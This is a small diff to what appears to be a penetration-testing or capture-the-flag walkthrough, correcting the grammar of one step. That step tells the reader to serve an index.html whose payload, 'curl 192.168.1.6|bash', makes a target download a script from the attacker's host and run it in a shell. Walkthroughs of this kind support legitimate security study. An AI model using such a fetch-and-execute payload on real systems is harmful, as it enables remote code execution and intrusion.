@@ -51,7 +51,7 @@ There create an ```index.html``` file
 touch index.html 
 ```
 
-Inside the ```index.html``` file put the following payload and change the IP address with the one that suit to the current environment
+Inside the ```index.html``` file put the following payload and change the IP address to the one that suits to the current environment
 
 ```
 curl 192.168.1.6|bash 
